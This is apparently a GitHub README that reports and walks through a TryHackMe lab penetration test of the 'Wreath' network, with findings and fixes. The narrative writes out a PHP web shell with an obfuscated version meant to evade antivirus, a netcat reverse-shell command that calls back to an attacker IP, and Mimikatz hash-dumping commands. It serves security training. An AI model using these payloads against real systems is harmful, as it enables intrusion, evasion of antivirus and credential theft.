# Wreath-Network-Pen-Test
A report and step by step walkthrough of a penetration test of the Wreath Network on TryHackMe.

## Overview
This was a "grey-box" penetration test of the Wreath network infrastructure and the brief was as follows:

*There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*

## Scope
Attack scope was restricted to the public webserver (10.200.57.200) and it's connected machines and/or services. 

## Executive Summary

The public facing web server was compromised using a publicly available exploit which ran as a root. This system was then used to pivot to the next machine in the internal network. This next machine hosted an internal GitStack server which was vulnerable to an exploit that allowed access to the systems user, resulting in system compromise and plain text passwords access. These passwords allowed authentication to the development server that was accessed via proxy from the GitStack server. A webpage on the development server contained an upload function that only used basic upload validation, which ultimately enabled the upload of a web shell and total compromise the final target. Outdated software was responsible for vunlerabilities that lead to immediate root access on two of the three machines and insecure code on a web page lead to malicious file upload and compromise of the third machine.

## Findings

### Outdated/ Unpatched software - Severity: CRITICAL

![CVE-2019-15107](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2019-15107) : MiniServ 1.890 (Webmin httpd)

Critical level vulnerability on public facing web-server that allows remote code execution(RCE) / total compromise when exploited.

![CVE-2018-5955](https://www.cvedetails.com/cve/CVE-2018-5955/) : GitStack 2.3.10

High level vulnerability on the GitStack server that allows user to log in as system when exploited.


#### Remediation:

Update to latest patch and maintain active patching schedule to keep up with new updates.

---

### Unrestricted File Upload - Severity : HIGH

Poor upload validation within the developer web page php code lead to a web shell being uploaded.

#### Remediation:

Implement stronger client + server side validation for any upload fields within the web page. Remove all unnessecary upload fields.

---

### Improper Privilege Management - Severity : HIGH

Both WebMin and GitStack services were running with highest possible privileges. When exploited, these services grant an attacker this same level of control over the system.

#### Remediation:

Follow the Rule of Least Privilege - services, software, users etc should only be granted the minimum permissions possible for them to carry out their intended function.

---

### Unquoted Service Path - Severity : HIGH

The `SystemExplorerHelpService` path was unqouted and allowed malicious file upload to " Wreath-PC " machine.

#### Remediation:

Ensure the path isn't unqouted and set correct directory ownership to prevent unauthorized tampering in the future.

---

### Weak Password Policy - Severity : HIGH

Accounts were found to use weak credentials (account beloning to Thomas) that were easily brute-forced and the passwords were used across multiple services.

#### Remediation:

Follow proper password policy regarding complexity, history etc
Use a trusted password manager if needed.

---

### Improper Error Handling - Severity : LOW

Errors displayed by Django on the public facing web-server give away other page addresses that can then be accessed by users.

This in itself ins't disasterous, however it directly lead to a page that was vulnerable to a publicly known exploit.

#### Remediation:

Configure the web framework to display as little information as possible in error messages to prevent attackers gaining infomation about the server. 

---



# Attack Narrative

## Enumeration of Web Server

Beginning with recon of the publicly facing web server, a quick scan revealed a few open services: 

![Screenshot 2023-06-05 121320](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/3fcfa5a6-1bb2-45ac-86ce-96b7c07f7700)

The website is only accessible after adding the IP to the local /hosts file:



![Screenshot 2023-06-05 122838](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/dd56e8db-1b2f-4e30-950e-70c93d6199e3)

Running a quick vulnerability script against the site reveals a potential weak point - the server is running MiniServ 1.890 which (after some brief research) is vulnerable to command injection (CVE-2019-15107): 

![Screenshot 2023-06-05 123211](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/61260bef-9673-44d2-9f12-9cde361fe007)


![Screenshot 2023-06-05 123525](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/2ec93739-f096-4de2-90ad-535f65a5b4a4)

## Exploitation of Web Server
I used the following tool to exploit this vulnerability: https://github.com/MuirlandOracle/CVE-2019-15107

After configuring and running the script, I was granted a root shell on the server:
![Screenshot 2023-06-05 125304](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/c9c97089-e9fd-47cf-aa64-8e53db929eea)

Following this, I made a copy of both the root password hash and ssh private key for future system persistence/ access.

![Screenshot 2023-06-05 124435](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/44fb7e29-69e8-4762-9f90-b39cac521b56)




# Pivoting 

## Git server Enumeration

Using a static nmap binary, supplied by my attacking machine, I scanned the internal network for other hosts within scope for potential targets to pivot to.

![Screenshot 2023-06-06 105002](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/4608d90f-7fc2-4d1a-81e3-317be8d40e96)


![Screenshot 2023-06-06 104945](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/6471e710-0afd-40b7-addb-cfa971bec375)

Scan result:

![Screenshot 2023-06-06 105638](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/06f8e8cc-5eae-48e8-afec-3c7f157d3487)

Success, both .150 and .100 machines are fair game.
Futher scanning of each machine individually revealed a few services running on .150 (including a web page) so I decided to attempt to pivot to this machine.
This was done using sshuttle - a program that works in a similar manner to a VPN, allowing direct connection to remote devices as if they were on the local network.
I was able to sign in as root on this machine using the SSH key from earlier. 

![Screenshot 2023-06-06 111757](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/d6433b0f-5dfe-417a-8190-0bf627827211)


Navigating to the web page hosted by .150 didn't reveal much, however poor error handling practices pointed me towards a potential attack vector.

![Screenshot 2023-06-06 112503](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/c427dd99-2315-4e9d-96d1-c07c2dc66c94)


![Screenshot 2023-06-06 112608](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/17ec55a5-6cd0-40e0-8d6d-d951f9ce1de4)

(Sadly the default credentials didn't work).

## Git server Exploitation 

After a little research, I found a Remote Code Execution exploit that could be used against the GitStack page: https://www.exploit-db.com/exploits/43777

Upon editing the exploit to my needs (changing target, ports etc), I ran it and saw that commands were indeed being executed via a webshell:

Shell function snippit:

![Screenshot 2023-06-06 120701](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/d69d5b5b-908b-4762-8a30-0236eb650cc7)


In action:

![Screenshot 2023-06-06 120500](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/381ac367-3fda-4cef-9e14-9a86d91aa7a6)

In order to efficiently execute commands & gain information about the machine, I used BurpSuite to execute commands:

![Screenshot 2023-06-06 121901](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f4080a43-904e-4a44-96fd-2fd3955cbaa8)


In order to deploy a shell, the .150 machine needed to be able to reach/ communicate with my machine.
I tested this via `ping` using the exploit and `tcpdump` on locally, however no traffic was getting through successfully, indicating that it was being blocked (likely by a firewall).
To navigate this issue, I opened a port, allowing traffic through the firewall:

![Screenshot 2023-06-07 103640](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/2faf878d-3098-4288-8de7-59bae31cca4f)

Next I set up a Netcat listener on the .200 machine (which was passing traffic to my attcking machine) and used a Powershell command to create a shell to call back to it:


![Screenshot 2023-06-07 110211](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/d280e7b2-4fe7-41f5-912e-35a0004d1c2e)

Shortly after, I was rewarded with Administrator level access to the Git server:


![Screenshot 2023-06-07 110231](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/75ee96a3-3a35-4742-a369-7ee1df40ff9d)

From earlier enumeration, ports 3389(RDP GUI) and 5985(WinRM CLI) were found to be open. 
Given that I was using an Admin account, I could create myself a new account that would be able to access the device via RDP whenever I wanted.


![Screenshot 2023-06-07 110736](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f4ceac67-2448-445b-a0ba-190117c81775)


To connect over RDP from Ubuntu, I used xfreerdp:

![Screenshot 2023-06-07 111609](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/c2827aab-1a19-4ed9-9cd7-4a0832264a47)

And created a share for easy tool access:

![Screenshot 2023-06-07 111847](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/3f71d2e1-9687-4f58-9186-4cc96688117e)

Using this share, I was able to launch Mimikatz in order to dump local SAM hashes:



![Screenshot 2023-06-07 112800](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/e482e10b-dfb4-45c3-af2d-07ff5eb7c8cd)

From here, I used :

`privilege::debug`which essentially grants the process higher privileges, enabling it to bypass certain security restrictions.

`token::elevate` which attempts to elevate the current user's access token to a higher privilege level.

Followed by `lsadump::sam` to get the hashes:



![Screenshot 2023-06-07 113153](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f661470b-a432-4760-aab9-c201bb186365)

After a few unsuccessful attempts and a wait, I managed to crack the hash for the user Thomas.


Using the Admin hash I was able to connect to the machine via WinRM for total exploitation of the .150 machine:



![Screenshot 2023-06-07 113614](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/46e28889-287e-428b-b7c4-57221d1cef8a)


## Personal Pc Enumeration

Referring back to the Network Map, only the personal PC remained to be compromised:

![Screenshot 2023-06-06 123740](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/69e2c024-c647-4943-b284-6b655abfc086)

As mentioned in the brief, this machine has an Anti-virus installed, so I had to be aware of this going forward.
As the .100 machine (personal PC) is only accessible from the git-server, I had to create another proxy (through the git-server) to be able to reach the .100 host.
I had previously used sshuttle to create a proxy between the Web server and Git server, and now a second one was necessary to reach the last machine. 
The traffic flow would look as follows:

Attacking Machine -> WebServer -> Git-Server -> Personal PC

Given this was a Windows host and I was now accessing it via 2 proxies, nmap was unlikely to be of much use, so I uploaded the Portscan.ps1 script from Powersploit to the machine via WinRM.
A scan of the final machine (.100) revealed ports 80 & 3389 to be open.

I used chisel (https://github.com/jpillora/chisel) to create this final proxy.
Firstly I opened a port on the git-server to allow traffic to traverse:

![Screenshot 2023-06-07 115605](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0876f6c2-ea22-4c68-b9f6-e65ce4abbce1)

Then uploaded the chisel executable to the server and ran it:


![Screenshot 2023-06-07 123637](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/8c80b9c9-5bd5-4740-abe7-2be901a2cb5c)

On my attacking machine I set up the chisel client (tunelling traffic via socks proxy):


![Screenshot 2023-06-07 135345](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/2c40ae66-0389-43eb-b03a-b08ab1533c37)

After connecting, I used the Foxy Proxy browser extension to access the web page that was now being tunnelled from the .100 machine.

Success!



![Screenshot 2023-06-07 135313](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/a04131cd-1d9e-43df-be46-9e155607a25d)

Now, whilst the webpage is accessible and can be enumerated, this would again be occuring through 2 proxies and would be too slow to tolerate. However, the brief mentioned that the git server is used for version control here, which presents an easier potential alternative form of enumeration in the form of a repository/ source codebase.

Finding the repository was relatively easy, given the WinRM access: 

![Screenshot 2023-06-07 140203](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/a6b01593-1ca3-4c43-99e5-1bdc1389e271)

Upon downloading, I used the extractor tool from GitTools (https://github.com/internetwache/GitTools) to view readable data and ended up with 3 local directories:



![Screenshot 2023-06-07 142259](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/19225637-f910-414b-954b-18b6f531d507)

Drilling down through the directories I found the components of the web site:



![Screenshot 2023-06-07 142631](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/80c86faf-936a-45b6-b22b-ba2c9928ea9c)


Within the index.php was a funciton that allowed file uploads (thus a potential vulnerability):

![Screenshot 2023-06-07 142906](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/474b67e9-ee3d-4d5f-b15f-30ffd1951dab)


Navigating to the site within the browser reveals a login page but luckily I managed to crack Thomas' password from the hash retrieved earlier and was granted access:

![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0023cd21-39f7-42e5-bcff-1ae85a2baf77)

## Personal Pc Exploitation

Now I had to find someway to take advantage of the upload function.

There are a few checks evident in the code that I had to be aware of (common rules such as file type, size and if the file is already present) but the process of bypassing these was pretty straightforward.
Changing the file extension to .php satisfies the file type filter but the `getimagesize()` function checks specifically for images:

```

$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();

```
`[1]` retrieves the second element from the array, which represents the file extension.

`in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)` checks if the file extension exists in the `$goodExts` array and if the extension is not found in the array the file is not uploaded.

Indeed, a legitmate image had to be uploaded so I used exiftool to allow me to place php shell code into the image metadata.
Knowing that anti-virus is present on the machine, it would be pretty foolish to upload a file containing an obvious shell but PHP Obfuscator (https://www.gaijin.at/en/tools/php-obfuscator) provides a means of obscuring the code, increasing the liklihood that it remains undetected by anti-virus.

Eg :

```
<?php
    $cmd = $_GET["frost"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

Becomes:

` <?php \$u0=\$_GET[base64_decode('ZnJvc3Q=')];if(isset(\$u0)){echo base64_decode('PHByZT4=').shell_exec(\$u0).base64_decode('PC9wcmU+');}die();?> `

After exiftool to embed the payload into the image, uploading it and navigating to it via URL (resources/uploads/frost.jpg.php), we can see that command execution is available.

`systeminfo`:

![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f8f2434a-de84-439d-a920-fc1e39b90a92)


The next step involved obtaining a full reverse shell from the web shell.
I uploaded a static netcat binary (https://github.com/int0x33/nc.exe/) to the server via a local python webserver and used powershell to set up the connection:

` powershell.exe c:\\windows\\temp\\nc-USERNAME.exe 10.10.146.80 12345 -e cmd.exe `

After gaining access and manually exploring the target, it became clear there was a potential Unquoted Service Path vulnerability in the ` SystemExplorerHelpService` service and I also had full read & write permissions to the directory:
```
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
```

In order to take advantage of these permissons a small wrapper script would likely bypass the instance of Defender running on this PC and be able to activate the netcat binary that is already present, thus estabilishing a shell as the local system.
The wrapper is as follows (you can see that `ProcessStartInfo` runs the binary and calls back to the attacking machine):

![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0a0626ef-6d47-4b80-a95a-8d28ba677d1a)

I then compiled and uploaded to the machine (I used the python server again).
Finally, I copied the script to `C:\Program Files (x86)\System Explorer\System.exe` , started a local listener and then stopped and started the service on the compromised machine:

` sc stop SystemExplorerHelpService `

` sc start SystemExplorerHelpService `

Listener:
```
C:\Windows\system32>whoami
whoami
nt authority\system
```

All 3 machines were now fully under my control.

![Screenshot 2023-06-07 140706](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/213952a3-a4af-471f-8aa2-f306c02fea69)

## Clean up

Upon total compromise completion of the network, all uploaded binaries, executables and created accounts etc were purged from the target systems, leaving them in the same state they were in before testing began. Whilst this operation was not conducted with discretion in mind, I strive to leave as little trace of my presence as possible for the sake of the client and general tidiness.   


## Conclusion

This concludes a successful penetration test on the Wreath Network. A multitude of serious vulnerabilities lead to multiple system compromise at the highest level and suggested remediations for these issues can be found in the Findings section of the report. On a positive note, this network can easily be hardened by following simple security procedures (Least privilege, password security, patching schedule etc) that will have no significantly disruptive impact on the functioning of any of the machines or services involved.
